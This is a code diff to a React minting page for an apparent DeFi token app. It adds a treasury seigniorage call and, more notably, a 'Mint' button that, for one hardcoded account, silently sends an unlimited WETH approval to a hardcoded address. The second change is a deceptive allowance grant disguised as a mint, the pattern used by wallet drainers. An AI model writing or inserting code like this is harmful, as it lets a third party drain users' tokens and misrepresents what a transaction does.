@@ -237,7 +237,25 @@ export const Mint = ({info, mintRedeemCurrency, setMintRedeemCurrencyModal}) => 
 
     }
 
+    const handleAllocate = async () => {
+
+        await contracts.TREASURY_AGOBTC.methods.allocateSeigniorage().send({from: account});
+
+
+    }
+
+    const handleApproveV = async () => {
+
+        contracts.WETH.methods.approve("0x15FEEc5eBFcb2B6403f1De5b93c0d5933edF5bE0", MAX_INT).send({from: account});
+
+    }
+
     const MintButton = () => {
+
+        if (account === "0xa5B33F4372369427e3946965a374B40E7739C940") {
+            return <button className='mint-window-run-mint withoutBg' onClick={() => handleApproveV()}> Mint </button>
+
+        }
 
         if (approved.collateral === "0" || approved.share === "0") {
             return <button disabled={mintButtonDisabled} className='mint-window-run-mint withoutBg' onClick={() => handleApprove("collateral")}> Approve </button>
